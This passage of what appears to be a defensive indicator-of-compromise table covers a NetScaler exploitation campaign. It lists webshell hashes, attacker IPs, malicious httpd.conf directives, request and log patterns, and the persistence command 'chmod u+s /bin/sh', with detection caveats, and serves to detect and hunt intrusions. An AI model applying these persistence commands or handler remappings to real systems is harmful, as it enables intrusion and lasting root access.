  { type: 'SHA-256', value: '6f5a2a452a7901323abd21879c6cecccb47c06aeeaccb1b467212f3b11e4b1e7', context: 'Webshell hash', caveat: GN_CAVEAT + ' Per-victim webshells may differ.', cite: ['gnblog'], share: 'TLP:CLEAR' },
  { type: 'GreyNoise tag', value: 'Citrix NetScaler CVE-2026-88771 Login Command Injection RCE Attempt', context: 'Sensor detection tag, created Sep 27. GreyNoise Visualizer on Sep 29: 76 unique IPs tagged between Sep 19 and Sep 29, all classified malicious. All are listed in this table; two are Cloudflare WARP exits, marked as such.', caveat: 'Classifies traffic seen by GreyNoise and community sensors only. Most tagged IPs also carry crawler and CitrixBleed 2 tags, so many look like opportunistic scanning.', cite: ['gntag', 'gnblog'], share: 'TLP:CLEAR' },
  { type: 'SHA-256', value: 'ed082f744f035035900f67edf438f2f7d0528ac501234f63d476d65273cdb9a1', context: '.ctxs.receiver webshell sample (237-byte PHP file) posted by a Reddit user, relayed by IFIN', caveat: 'Unconfirmed single-victim sample. The hardcoded token likely differs per victim, so the hash will too - match on file content, not hash.', cite: ['ifin'], share: 'Public, no restriction' },
  { type: 'IPv4', value: '104.248.244.66', context: 'Potential C2 IP observed by Truesec', caveat: IR_CAVEAT, cite: ['truesec', 'ifin', 'unit42'], share: 'Public page, no TLP marking' },
  { type: 'IPv4', value: '139.180.152.138', context: 'Potential C2 IP observed by Truesec; webshell delivery per eSentire', caveat: IR_CAVEAT, cite: ['truesec', 'ifin', 'esentire', 'unit42'], share: 'Public page, no TLP marking' },
  { type: 'IPv4', value: '77.83.199.39', context: 'Potential C2 IP observed by Truesec; webshell delivery per eSentire', caveat: IR_CAVEAT, cite: ['truesec', 'ifin', 'esentire', 'unit42', 'sygnia'], share: 'Public page, no TLP marking' },
  { type: 'IPv4', value: '78.135.96.136', context: 'Associated exploit source (IFIN compiled observables)', caveat: IFIN_CAVEAT, cite: ['ifin'], share: 'Public, no restriction' },
  { type: 'IPv4', value: '149.28.29.221', context: 'Associated exploit source (IFIN compiled observables)', caveat: IFIN_CAVEAT, cite: ['ifin'], share: 'Public, no restriction' },
  { type: 'IPv4', value: '80.240.22.229', context: 'Associated exploit source (IFIN compiled observables)', caveat: IFIN_CAVEAT, cite: ['ifin'], share: 'Public, no restriction' },
  { type: 'IPv4', value: '89.36.231.206', context: 'Associated exploit source (IFIN compiled observables)', caveat: IFIN_CAVEAT, cite: ['ifin'], share: 'Public, no restriction' },
  { type: 'IPv4', value: '91.195.240.123', context: 'Associated exploit source (IFIN compiled observables)', caveat: IFIN_CAVEAT + ' WHOIS: SEDO-NET, Sedo Domain Parking - a shared parking IP used by many unrelated parked domains. Expect heavy false positives; do not block on it alone.', cite: ['ifin'], share: 'Public, no restriction' },
  { type: 'IPv4', value: '143.198.7.94', context: 'Scanning and staging infrastructure', caveat: GTIG_CAVEAT, cite: ['gtig'], share: GTIG_SHARE },
  { type: 'IPv4', value: '157.254.167.12', context: 'NetScaler exploitation and installation of a basic webshell backdoor', caveat: GTIG_CAVEAT, cite: ['gtig'], share: GTIG_SHARE },
  { type: 'HTTP header', value: 'HTTP_NSC_LDAP', context: 'Inbound command execution header used by nsginstaller.deb', caveat: GTIG_CAVEAT, cite: ['gtig'], share: GTIG_SHARE },
  { type: 'HTTP header', value: 'HTTP_NSC_CLIENTTYPE', context: 'Inbound command execution header used by nsgclient.sig', caveat: GTIG_CAVEAT, cite: ['gtig'], share: GTIG_SHARE },
  { type: 'HTTP header', value: 'HTTP_X_UX / HTTP_X_UX_[0-9]+', context: 'Chunked base64 transport headers used by WHIPSHOT', caveat: GTIG_CAVEAT, cite: ['gtig'], share: GTIG_SHARE },
  { type: 'URI path', value: '/vpn/media/nsgclient.ico / /vpn/media/*.ico', context: 'Masquerading icon request routed to a .sig webshell via AliasMatch', caveat: GTIG_CAVEAT, cite: ['gtig'], share: GTIG_SHARE },
  { type: 'URI path', value: '/vpn/scripts/linux/nsginstaller*.deb', context: 'Staging path for malicious PHP webshells', caveat: GTIG_CAVEAT, cite: ['gtig'], share: GTIG_SHARE },
  { type: 'URI path', value: '/vpn/scripts/linux/nsgclient*.deb', context: 'Staging path for malicious PHP webshells', caveat: GTIG_CAVEAT, cite: ['gtig'], share: GTIG_SHARE },
  { type: 'URI path', value: '/vpn/scripts/linux/*.php', context: 'Staging path for malicious PHP webshells', caveat: GTIG_CAVEAT, cite: ['gtig'], share: GTIG_SHARE },
  { type: 'File path', value: '/tmp/.uxdport', context: 'SLAPSHOT active port artefact', caveat: GTIG_CAVEAT, cite: ['gtig'], share: GTIG_SHARE },
  { type: 'File path', value: '/tmp/.uxdlock', context: 'SLAPSHOT process lock artefact', caveat: GTIG_CAVEAT, cite: ['gtig'], share: GTIG_SHARE },
  { type: 'Config directive', value: 'AddHandler application/x-httpd-php .deb', context: 'httpd.conf change making .deb files run as PHP (GTIG persistence method A)', caveat: GTIG_CAVEAT + ' Any AddHandler/AddType mapping a non-PHP extension to PHP indicates compromise, per GTIG.', cite: ['gtig'], share: GTIG_SHARE },
  { type: 'Config directive', value: 'AddHandler application/x-httpd-php .sig', context: 'httpd.conf change making .sig files run as PHP (GTIG persistence method B)', caveat: GTIG_CAVEAT, cite: ['gtig'], share: GTIG_SHARE },
  { type: 'Config directive', value: 'AliasMatch ^/vpn/media/(.+).ico$ /var/netscaler/gui/vpn/scripts/linux/$1.sig', context: 'Routes /vpn/media/*.ico requests to a .sig webshell with the same base name', caveat: GTIG_CAVEAT, cite: ['gtig'], share: GTIG_SHARE },
  { type: 'File path', value: '/netscaler/ns_gui/vpn/scripts/linux/', context: 'Directory where WHIPSHOT was placed', caveat: GTIG_CAVEAT + ' Legitimate client binaries live here too; look for ASCII text or PHP markers.', cite: ['gtig'], share: GTIG_SHARE },
  { type: 'Filename pattern', value: 'nginstaller*', context: 'Installer webshell names seen across intrusions, often followed by a number', caveat: GTIG_CAVEAT + ' GTIG says filenames varied between victims.', cite: ['gtig'], share: GTIG_SHARE },
  { type: 'Filename', value: 'nsgclient.sig', context: '.sig webshell in VPN script directories', caveat: GTIG_CAVEAT, cite: ['gtig'], share: GTIG_SHARE },
  { type: 'Filename', value: 'e6ee7c85.sig', context: 'GTIG example .sig webshell: reads base64 payloads from HTTP_NSC_CLIENTTYPE, runs them via eval() and returns a fake 404. Reached as /vpn/media/e6ee7c85.ico through the AliasMatch above', caveat: GTIG_CAVEAT + ' Example from one intrusion; GTIG says filenames varied between victims, so absence proves nothing.', cite: ['gtig'], share: GTIG_SHARE },
  { type: 'Log string', value: 'pitboss NOT restarting NSPPE', context: 'Watchdog message in /var/log/messages after an NSPPE crash', caveat: GTIG_CAVEAT + ' Strongest when it follows a DTLSv1.0 SSL_HANDSHAKE_FAILURE on the same appliance.', cite: ['gtig'], share: GTIG_SHARE },
  { type: 'String', value: 'UXD_IDLE_EXIT', context: 'SLAPSHOT idle-exit variable', caveat: GTIG_CAVEAT, cite: ['gtig'], share: GTIG_SHARE },
  { type: 'Command', value: 'chmod u+s /bin/sh', context: 'Sets setuid on /bin/sh for persistent root; ls -l /bin/sh showing -rwsr-xr-x owned by root means modified', caveat: GTIG_CAVEAT, cite: ['gtig', 'gnblog'], share: GTIG_SHARE },
  { type: 'IPv4', value: '138.199.200.90', context: 'Destination for data exfiltrated via log poisoning (Hetzner), seen by Lupovis', caveat: LUP_CAVEAT, cite: ['helpnet'], share: LUP_SHARE },
  { type: 'IPv4', value: '138.28.234.38', context: 'Exploitation with attempted DNS exfiltration (Lupovis)', caveat: LUP_CAVEAT, cite: ['lupovisx', 'beazley'], share: LUP_SHARE },
  { type: 'IPv4', value: '82.167.14.7', context: 'Exploitation check that writes a test marker (Lupovis); exploitation source per eSentire; also tagged by GreyNoise', caveat: LUP_CAVEAT + ' May be a researcher-style check.', cite: ['beazley', 'gntag', 'esentire'], share: LUP_SHARE },
  { type: 'IPv4', value: '85.203.46.191', context: 'Reconnaissance (Lupovis)', caveat: LUP_CAVEAT + ' WHOIS netname Express-Equinix-London; GreyNoise tags it as VPN, so likely a commercial VPN exit shared by many users.', cite: ['beazley', 'gntag'], share: LUP_SHARE },
  { type: 'IPv4', value: '154.217.251.226', context: 'CVE-2026-88772 scanning (Lupovis); also tagged by GreyNoise', caveat: LUP_CAVEAT, cite: ['beazley', 'gntag'], share: LUP_SHARE },
  { type: 'IPv4', value: '194.26.29.88', context: 'Host of the reverse shell documented by Corelight (WHOIS: Media Land LLC, RU)', caveat: 'Reverse-shell infrastructure; hunt for connections from NetScaler NSIP/SNIP addresses.', cite: ['corelight'], share: 'Public blog, no TLP marking' },
  { type: 'DNS pattern', value: '*.instances.httpworkbench.com', context: 'Outbound lookups from a NetScaler suggest an out-of-band callback (Lupovis hunt advice)', caveat: 'httpworkbench.com is a public HTTP/DNS testing service, also used by researchers. Hunt signal only when the lookup comes from a NetScaler; do not block the apex.', cite: ['helpnet', 'beazley'], share: LUP_SHARE },
  { type: 'HTTP request pattern', value: 'POST /nf/auth/doAuthentication.do with body containing "pitboss PPE unexpectedly died NSPPE"', context: 'Log-poisoning exploitation attempt (Lupovis hunt advice)', caveat: LUP_CAVEAT, cite: ['helpnet'], share: LUP_SHARE },
  { type: 'URI path', value: '/nf/auth/doAuthentication.do', context: 'CVE-2026-88771 exploitation attempts seen on Defused decoys (any logged field works)', caveat: DEF_CAVEAT, cite: ['defused', 'helpnet'], share: DEF_SHARE },
  { type: 'URI path', value: '/cgi/login', context: 'CVE-2026-88771 exploitation attempts seen on Defused decoys', caveat: DEF_CAVEAT, cite: ['defused'], share: DEF_SHARE },
  { type: 'URI path', value: '/p/u/doLogon.do', context: 'CVE-2026-88771 exploitation attempts seen on Defused decoys', caveat: DEF_CAVEAT, cite: ['defused'], share: DEF_SHARE },
  { type: 'URI path', value: '/logon/LogonPoint/tmindex.html', context: 'CVE-2026-88771 exploitation attempts seen on Defused decoys', caveat: DEF_CAVEAT, cite: ['defused'], share: DEF_SHARE },
  { type: 'HTTP header', value: 'User-Agent (payload in the header on requests to /)', context: 'CVE-2026-88771 exploitation attempts seen on Defused decoys', caveat: DEF_CAVEAT + ' CERT-EU separately flags base64 User-Agent strings starting with INDEX:.', cite: ['defused', 'certeu'], share: DEF_SHARE },
  { type: 'Filename', value: 'nx_verify.html', context: 'Marker file dropped to tag vulnerable boxes for a target list (Defused)', caveat: 'Also written by testers; means the box was reached and is exploitable, not necessarily that an actor installed a backdoor.', cite: ['defused'], share: DEF_SHARE },
  { type: 'SHA-256', value: '5ea5ea61e9062822bee3f66ef5ff47c217178d9e31936ad6daf10c5dfae44d12', context: 'PHP webshell, .ico variant (publicly on VirusTotal per eSentire); Sygnia also found it during an active IR investigation', caveat: ES_CAVEAT, cite: ['esentire', 'sygnia'], share: ES_SHARE },
  { type: 'SHA-256', value: '7add390ceee4a1373211b3e340451b34f08965fc4d805f94c9b8cebdc0775774', context: 'PHP webshell, .deb variant (not in public repositories per eSentire)', caveat: ES_CAVEAT, cite: ['esentire'], share: ES_SHARE },
  { type: 'File path', value: '/var/netscaler/gui/vpn/scripts/linux/*.sig', context: '.ico-variant webshell location (eSentire); also matches GTIG method B', caveat: ES_CAVEAT, cite: ['esentire', 'gtig'], share: ES_SHARE },
  { type: 'HTTP request pattern', value: 'GET /vpn/media/*.ico with base64 PHP (starting "PD9") appended to the User-Agent', context: 'Payload staging via the access log (eSentire; matches CERT-EU technique)', caveat: ES_CAVEAT, cite: ['esentire', 'certeu'], share: ES_SHARE },
  { type: 'IPv4', value: '34.90.151.231', context: 'Reconnaissance and webshell delivery (eSentire)', caveat: ES_CAVEAT + ' Google Cloud address space; may be reassigned.', cite: ['esentire'], share: ES_SHARE },
  { type: 'IPv4', value: '31.56.197.72', context: 'Payload host (eSentire); Arctic Wolf: served /lula on ports 80 and 9090, and /kk', caveat: ES_CAVEAT + LB_NOTE, cite: ['esentire', 'arcticwolf', 'levelblue'], share: ES_SHARE },
  { type: 'IPv4', value: '64.94.85.67', context: 'Payload host (eSentire); also tagged by GreyNoise', caveat: ES_CAVEAT + LB_NOTE, cite: ['esentire', 'gntag', 'arcticwolf', 'sygnia', 'levelblue'], share: ES_SHARE },
  { type: 'IPv4', value: '23.27.143.20', context: 'Payload host (eSentire); Arctic Wolf: served main.py on port 9000, saved as /var/1.py and run with python', caveat: ES_CAVEAT + LB_NOTE, cite: ['esentire', 'arcticwolf', 'levelblue'], share: ES_SHARE },
  { type: 'IPv4', value: '62.133.62.80', context: 'Payload host (eSentire)', caveat: ES_CAVEAT + LB_NOTE, cite: ['esentire', 'arcticwolf', 'levelblue'], share: ES_SHARE },
  { type: 'IPv4', value: '144.172.108.78', context: 'Exploitation source (eSentire)', caveat: ES_CAVEAT, cite: ['esentire'], share: ES_SHARE },
  { type: 'IPv4', value: '185.156.46.162', context: 'Exploitation source (eSentire); also tagged by GreyNoise', caveat: ES_CAVEAT + ' GreyNoise tags it as VPN; may be shared.', cite: ['esentire', 'gntag'], share: ES_SHARE },
  { type: 'IPv4', value: '153.75.82.220', context: 'Exploitation source (eSentire); also tagged by GreyNoise; Arctic Wolf: served /download/x.sh, piped to bash', caveat: ES_CAVEAT, cite: ['esentire', 'gntag', 'arcticwolf'], share: ES_SHARE },
  { type: 'IPv4', value: '216.203.21.233', context: 'Exploitation source (eSentire); also tagged by GreyNoise', caveat: ES_CAVEAT, cite: ['esentire', 'gntag'], share: ES_SHARE },
  { type: 'IPv4', value: '185.243.41.247', context: 'Campaign infrastructure (eSentire)', caveat: ES_CAVEAT, cite: ['esentire'], share: ES_SHARE },
  { type: 'Network', value: 'UDP/443 (DTLSv1.0)', context: 'Delivery protocol for the CVE-2026-88772 exploit (GTIG)', caveat: GTIG_CAVEAT + ' Legitimate DTLS VPN traffic uses the same port; baseline normal DTLS sources.', cite: ['gtig'], share: GTIG_SHARE },
  { type: 'Config directive', value: 'Alias /logon/LogonPoint/custom/receiver.min.css', context: 'httpd.conf route to the .ctxs.receiver webshell (GreyNoise, via Beazley)', caveat: BSL_CAVEAT, cite: ['bsl', 'gnblog'], share: BSL_SHARE },
  { type: 'Config directive', value: 'AliasMatch ^/logon/LogonPoint/custom/receiver\\.min\\.[0-9a-f]+\\.css$', context: 'httpd.conf route variant to the webshell (GreyNoise, via Beazley)', caveat: BSL_CAVEAT, cite: ['bsl', 'gnblog'], share: BSL_SHARE },
  { type: 'Config directive', value: 'php_flag engine on (changed from off) plus a SetHandler block for the webshell file', context: 'PHP enabled for the webshell in httpd.conf (GreyNoise, CERT-EU, via Beazley)', caveat: BSL_CAVEAT + ' Compare /etc/httpd.conf with a clean appliance on the same build.', cite: ['bsl', 'certeu'], share: BSL_SHARE },
  { type: 'HTTP cookie', value: 'CsrfToken + NSC_TASS', context: 'Cookies used to access the .ctxs.receiver webshell (GreyNoise, via Beazley)', caveat: 'NetScaler uses both cookies legitimately. Suspicious only when NSC_TASS carries URL-encoded commands on requests to the webshell path.', cite: ['bsl', 'ifin'], share: BSL_SHARE },
  { type: 'Log string', value: 'pitboss log lines containing IFS or b64decode', context: 'Log-poisoning exploitation of CVE-2026-88771 (Beaumont, via Beazley); check ns.log, /var/log/messages and your SIEM', caveat: BSL_CAVEAT, cite: ['bsl'], share: BSL_SHARE },
  { type: 'Log string', value: '"missed too many heartbeats" or "unexpectedly died" in authentication log lines', context: 'Crafted login usernames imitating packet-engine messages (watchTowr, CERT-EU, via Beazley); ns.log', caveat: BSL_CAVEAT, cite: ['bsl', 'certeu', 'arcticwolf', 'sygnia'], share: BSL_SHARE },
  { type: 'User-Agent', value: 'ns-88771-poc', context: 'Public PoC/scanner User-Agent seen by Lupovis (via Beazley); Apache access logs', caveat: 'A public testing tool, not an actor indicator. Means someone tested the box.', cite: ['bsl'], share: BSL_SHARE },
  { type: 'String', value: 'NX-CVE-OK', context: 'Test-marker text dropped in web folders by exploitation checks (Lupovis, via Beazley); grep /netscaler/ns_gui', caveat: 'Means the box was reached and is exploitable, not necessarily backdoored.', cite: ['bsl'], share: BSL_SHARE },
  { type: 'File permission', value: '/bin/sh expected -r-xr-xr-x (setuid means modified)', context: 'Check with ls -l /bin/sh before patching; the installer sets setuid (Beazley, GTIG)', caveat: BSL_CAVEAT, cite: ['bsl', 'gtig'], share: BSL_SHARE },
  { type: 'IPv4', value: '172.247.44.85', context: 'Tagged by GreyNoise for CVE-2026-88771 exploitation attempts, last seen Sep 28-29 (CNSERVERS LLC, United States)', caveat: GN_SCAN_CAVEAT, cite: ['gntag'], share: GN_SCAN_SHARE },
  { type: 'IPv4', value: '165.227.201.112', context: 'Tagged by GreyNoise for CVE-2026-88771 exploitation attempts, last seen Sep 28-29 (DigitalOcean, LLC, United States)', caveat: GN_SCAN_CAVEAT, cite: ['gntag'], share: GN_SCAN_SHARE },
  { type: 'IPv4', value: '173.231.39.244', context: 'Tagged by GreyNoise for CVE-2026-88771 exploitation attempts, last seen Sep 28-29 (WebNX, Inc., United States)', caveat: GN_SCAN_CAVEAT, cite: ['gntag'], share: GN_SCAN_SHARE },
  { type: 'IPv4', value: '64.225.103.14', context: 'Tagged by GreyNoise for CVE-2026-88771 exploitation attempts, last seen Sep 28-29 (DigitalOcean, LLC, Germany)', caveat: GN_SCAN_CAVEAT, cite: ['gntag'], share: GN_SCAN_SHARE },
  { type: 'IPv4', value: '159.65.104.231', context: 'Tagged by GreyNoise for CVE-2026-88771 exploitation attempts, last seen Sep 28-29 (DigitalOcean, LLC, United States)', caveat: GN_SCAN_CAVEAT, cite: ['gntag'], share: GN_SCAN_SHARE },
  { type: 'IPv4', value: '142.93.205.229', context: 'Tagged by GreyNoise for CVE-2026-88771 exploitation attempts, last seen Sep 28-29 (DigitalOcean, LLC, United States)', caveat: GN_SCAN_CAVEAT, cite: ['gntag'], share: GN_SCAN_SHARE },
  { type: 'IPv4', value: '182.101.54.57', context: 'Tagged by GreyNoise for CVE-2026-88771 exploitation attempts, last seen Sep 28-29 (CHINANET BACKBONE, China)', caveat: GN_SCAN_CAVEAT + ' Consumer/ISP address: likely a compromised device or residential proxy; do not block on it.', cite: ['gntag'], share: GN_SCAN_SHARE },
  { type: 'IPv4', value: '87.224.84.82', context: 'Tagged by GreyNoise for CVE-2026-88771 exploitation attempts, last seen Sep 28-29 (Spitfire Network Services Limited, United Kingdom). LevelBlue: source of a configuration-staging attempt', caveat: GN_SCAN_CAVEAT + ' Consumer/ISP address: likely a compromised device or residential proxy; do not block on it.' + LB_NOTE, cite: ['gntag', 'levelblue'], share: GN_SCAN_SHARE },
  { type: 'IPv4', value: '137.220.53.135', context: 'Tagged by GreyNoise for CVE-2026-88771 exploitation attempts, last seen Sep 28-29 (The Constant Company, LLC, Canada)', caveat: GN_SCAN_CAVEAT, cite: ['gntag'], share: GN_SCAN_SHARE },
  { type: 'IPv4', value: '120.28.233.211', context: 'Tagged by GreyNoise for CVE-2026-88771 exploitation attempts, last seen Sep 28-29 (Globe Telecoms, Philippines)', caveat: GN_SCAN_CAVEAT + ' Consumer/ISP address: likely a compromised device or residential proxy; do not block on it.', cite: ['gntag'], share: GN_SCAN_SHARE },
  { type: 'IPv4', value: '149.28.58.71', context: 'Tagged by GreyNoise for CVE-2026-88771 exploitation attempts, last seen Sep 28-29 (The Constant Company, LLC, United States)', caveat: GN_SCAN_CAVEAT, cite: ['gntag'], share: GN_SCAN_SHARE },
  { type: 'IPv4', value: '23.234.111.22', context: 'Tagged by GreyNoise for CVE-2026-88771 exploitation attempts, last seen Sep 28-29 (tzulo, inc., United States)', caveat: GN_SCAN_CAVEAT + ' VPN or proxy exit shared by many users; do not block on it.', cite: ['gntag'], share: GN_SCAN_SHARE },
  { type: 'IPv4', value: '198.13.159.233', context: 'Tagged by GreyNoise for CVE-2026-88771 exploitation attempts, last seen Sep 28-29 (BL Networks, Netherlands)', caveat: GN_SCAN_CAVEAT, cite: ['gntag'], share: GN_SCAN_SHARE },
  { type: 'IPv4', value: '85.221.203.85', context: 'Tagged by GreyNoise for CVE-2026-88771 exploitation attempts, last seen Sep 28-29 (INEA sp. z o.o., Poland)', caveat: GN_SCAN_CAVEAT + ' Consumer/ISP address: likely a compromised device or residential proxy; do not block on it.', cite: ['gntag'], share: GN_SCAN_SHARE },
  { type: 'IPv4', value: '46.150.68.55', context: 'Tagged by GreyNoise for CVE-2026-88771 exploitation attempts, last seen Sep 28-29 (Kyivski Telekomunikatsiyni Merezhi, Ukraine)', caveat: GN_SCAN_CAVEAT + ' Consumer/ISP address: likely a compromised device or residential proxy; do not block on it.', cite: ['gntag'], share: GN_SCAN_SHARE },
  { type: 'IPv4', value: '159.26.103.184', context: 'Tagged by GreyNoise for CVE-2026-88771 exploitation attempts, last seen Sep 28-29 (Proton AG, United States)', caveat: GN_SCAN_CAVEAT + ' VPN or proxy exit shared by many users; do not block on it.', cite: ['gntag'], share: GN_SCAN_SHARE },
  { type: 'IPv4', value: '45.249.89.172', context: 'Tagged by GreyNoise for CVE-2026-88771 exploitation attempts, last seen Sep 28-29 (SpeedyPage Ltd, Japan)', caveat: GN_SCAN_CAVEAT, cite: ['gntag'], share: GN_SCAN_SHARE },
  { type: 'IPv4', value: '197.52.9.138', context: 'Tagged by GreyNoise for CVE-2026-88771 exploitation attempts, last seen Sep 28-29 (TE-AS, Egypt)', caveat: GN_SCAN_CAVEAT + ' Consumer/ISP address: likely a compromised device or residential proxy; do not block on it.', cite: ['gntag'], share: GN_SCAN_SHARE },
  { type: 'IPv4', value: '180.242.113.168', context: 'Tagged by GreyNoise for CVE-2026-88771 exploitation attempts, last seen Sep 28-29 (PT Telekomunikasi Indonesia, Indonesia)', caveat: GN_SCAN_CAVEAT + ' Consumer/ISP address: likely a compromised device or residential proxy; do not block on it.', cite: ['gntag'], share: GN_SCAN_SHARE },
  { type: 'IPv4', value: '85.117.117.248', context: 'Tagged by GreyNoise for CVE-2026-88771 exploitation attempts, last seen Sep 28-29 (Mobile Telecom-Service LLP, Kazakhstan)', caveat: GN_SCAN_CAVEAT + ' Consumer/ISP address: likely a compromised device or residential proxy; do not block on it.', cite: ['gntag'], share: GN_SCAN_SHARE },
  { type: 'IPv4', value: '73.43.85.7', context: 'Tagged by GreyNoise for CVE-2026-88771 exploitation attempts, last seen Sep 28-29 (Comcast Cable Communications, LLC, United States)', caveat: GN_SCAN_CAVEAT + ' Consumer/ISP address: likely a compromised device or residential proxy; do not block on it.', cite: ['gntag'], share: GN_SCAN_SHARE },
  { type: 'IPv4', value: '88.180.103.22', context: 'Tagged by GreyNoise for CVE-2026-88771 exploitation attempts, last seen Sep 28-29 (Free SAS, France)', caveat: GN_SCAN_CAVEAT + ' Consumer/ISP address: likely a compromised device or residential proxy; do not block on it.', cite: ['gntag'], share: GN_SCAN_SHARE },
  { type: 'IPv4', value: '194.28.195.90', context: 'Tagged by GreyNoise for CVE-2026-88771 exploitation attempts, last seen Sep 28-29 (Dialog-K LLC, Russia)', caveat: GN_SCAN_CAVEAT + ' Consumer/ISP address: likely a compromised device or residential proxy; do not block on it.', cite: ['gntag'], share: GN_SCAN_SHARE },
  { type: 'IPv4', value: '95.63.246.50', context: 'Tagged by GreyNoise for CVE-2026-88771 exploitation attempts, last seen Sep 28-29 (Vodafone Espana S.A.U., Spain)', caveat: GN_SCAN_CAVEAT + ' Consumer/ISP address: likely a compromised device or residential proxy; do not block on it.', cite: ['gntag'], share: GN_SCAN_SHARE },
  { type: 'IPv4', value: '31.13.192.160', context: 'Tagged by GreyNoise for CVE-2026-88771 exploitation attempts, last seen Sep 28-29 (SKAT POPOVO Ltd., Bulgaria)', caveat: GN_SCAN_CAVEAT + ' Consumer/ISP address: likely a compromised device or residential proxy; do not block on it.', cite: ['gntag'], share: GN_SCAN_SHARE },
  { type: 'IPv4', value: '185.170.55.89', context: 'Tagged by GreyNoise for CVE-2026-88771 exploitation attempts, last seen Sep 28-29 (LLC Electron-Telecom, Russia)', caveat: GN_SCAN_CAVEAT + ' Consumer/ISP address: likely a compromised device or residential proxy; do not block on it.', cite: ['gntag'], share: GN_SCAN_SHARE },
  { type: 'IPv4', value: '104.203.50.26', context: 'Tagged by GreyNoise for CVE-2026-88771 exploitation attempts, last seen Sep 28-29 (Blue Stream, United States)', caveat: GN_SCAN_CAVEAT + ' Consumer/ISP address: likely a compromised device or residential proxy; do not block on it.', cite: ['gntag'], share: GN_SCAN_SHARE },
  { type: 'IPv4', value: '37.19.221.171', context: 'Tagged by GreyNoise for CVE-2026-88771 exploitation attempts, last seen Sep 28-29 (Datacamp Limited, United States)', caveat: GN_SCAN_CAVEAT + ' VPN or proxy exit shared by many users; do not block on it.', cite: ['gntag'], share: GN_SCAN_SHARE },
  { type: 'IPv4', value: '45.143.167.96', context: 'Tagged by GreyNoise for CVE-2026-88771 exploitation attempts, last seen Sep 28-29 (BlueVPS OU, Netherlands)', caveat: GN_SCAN_CAVEAT, cite: ['gntag'], share: GN_SCAN_SHARE },
  { type: 'IPv4', value: '206.232.71.215', context: 'Tagged by GreyNoise for CVE-2026-88771 exploitation attempts, last seen Sep 28-29 (Leaseweb Deutschland GmbH, Germany)', caveat: GN_SCAN_CAVEAT, cite: ['gntag'], share: GN_SCAN_SHARE },
  { type: 'IPv4', value: '130.94.106.141', context: 'Tagged by GreyNoise for CVE-2026-88771 exploitation attempts, last seen Sep 28-29 (LIGHT NODE LIMITED, Argentina)', caveat: GN_SCAN_CAVEAT, cite: ['gntag'], share: GN_SCAN_SHARE },
  { type: 'IPv4', value: '58.187.56.89', context: 'Tagged by GreyNoise for CVE-2026-88771 exploitation attempts, last seen Sep 28-29 (FPT Telecom Company, Vietnam)', caveat: GN_SCAN_CAVEAT + ' Consumer/ISP address: likely a compromised device or residential proxy; do not block on it.', cite: ['gntag'], share: GN_SCAN_SHARE },
  { type: 'IPv4', value: '171.106.10.118', context: 'Tagged by GreyNoise for CVE-2026-88771 exploitation attempts, last seen Sep 28-29 (CHINANET BACKBONE, China)', caveat: GN_SCAN_CAVEAT + ' Consumer/ISP address: likely a compromised device or residential proxy; do not block on it.', cite: ['gntag'], share: GN_SCAN_SHARE },
  { type: 'IPv4', value: '82.24.212.15', context: 'Tagged by GreyNoise for CVE-2026-88771 exploitation attempts, last seen Sep 28-29 (Shock Hosting LLC, United States)', caveat: GN_SCAN_CAVEAT, cite: ['gntag'], share: GN_SCAN_SHARE },
  { type: 'IPv4', value: '178.66.43.241', context: 'Tagged by GreyNoise for CVE-2026-88771 exploitation attempts, last seen Sep 28-29 (PJSC Rostelecom, Russia)', caveat: GN_SCAN_CAVEAT + ' Consumer/ISP address: likely a compromised device or residential proxy; do not block on it.', cite: ['gntag'], share: GN_SCAN_SHARE },
  { type: 'IPv4', value: '185.209.15.246', context: 'Tagged by GreyNoise for CVE-2026-88771 exploitation attempts, last seen Sep 28-29 (ESTOXY OU, Netherlands)', caveat: GN_SCAN_CAVEAT, cite: ['gntag'], share: GN_SCAN_SHARE },
  { type: 'IPv4', value: '94.190.77.195', context: 'Tagged by GreyNoise for CVE-2026-88771 exploitation attempts, last seen Sep 28-29 (INTERRA telecommunications group, Ltd., Russia)', caveat: GN_SCAN_CAVEAT + ' Consumer/ISP address: likely a compromised device or residential proxy; do not block on it.', cite: ['gntag'], share: GN_SCAN_SHARE },
  { type: 'IPv4', value: '93.177.60.233', context: 'Tagged by GreyNoise for CVE-2026-88771 exploitation attempts, last seen Sep 28-29 (PJSC Rostelecom, Russia)', caveat: GN_SCAN_CAVEAT + ' Consumer/ISP address: likely a compromised device or residential proxy; do not block on it.', cite: ['gntag'], share: GN_SCAN_SHARE },
  { type: 'IPv4', value: '68.46.140.222', context: 'Tagged by GreyNoise for CVE-2026-88771 exploitation attempts, last seen Sep 28-29 (Comcast Cable Communications, LLC, United States)', caveat: GN_SCAN_CAVEAT + ' Consumer/ISP address: likely a compromised device or residential proxy; do not block on it.', cite: ['gntag'], share: GN_SCAN_SHARE },
  { type: 'IPv4', value: '178.218.40.232', context: 'Tagged by GreyNoise for CVE-2026-88771 exploitation attempts, last seen Sep 28-29 (ATEXS PLUS Ltd., Russia)', caveat: GN_SCAN_CAVEAT + ' Consumer/ISP address: likely a compromised device or residential proxy; do not block on it.', cite: ['gntag'], share: GN_SCAN_SHARE },
  { type: 'IPv4', value: '49.36.107.103', context: 'Tagged by GreyNoise for CVE-2026-88771 exploitation attempts, last seen Sep 28-29 (Reliance Jio Infocomm Limited, India)', caveat: GN_SCAN_CAVEAT + ' Consumer/ISP address: likely a compromised device or residential proxy; do not block on it.', cite: ['gntag'], share: GN_SCAN_SHARE },
  { type: 'IPv4', value: '191.37.30.194', context: 'Tagged by GreyNoise for CVE-2026-88771 exploitation attempts, last seen Sep 28-29 (WRNET LTDA, Brazil)', caveat: GN_SCAN_CAVEAT + ' Consumer/ISP address: likely a compromised device or residential proxy; do not block on it.', cite: ['gntag'], share: GN_SCAN_SHARE },
  { type: 'IPv4', value: '23.234.74.48', context: 'Tagged by GreyNoise for CVE-2026-88771 exploitation attempts, last seen Sep 28-29 (tzulo, inc., United States)', caveat: GN_SCAN_CAVEAT + ' VPN or proxy exit shared by many users; do not block on it.', cite: ['gntag'], share: GN_SCAN_SHARE },
  { type: 'IPv4', value: '72.73.231.73', context: 'Tagged by GreyNoise for CVE-2026-88771 exploitation attempts, last seen Sep 28-29 (Verizon Business, United States)', caveat: GN_SCAN_CAVEAT + ' Consumer/ISP address: likely a compromised device or residential proxy; do not block on it.', cite: ['gntag'], share: GN_SCAN_SHARE },
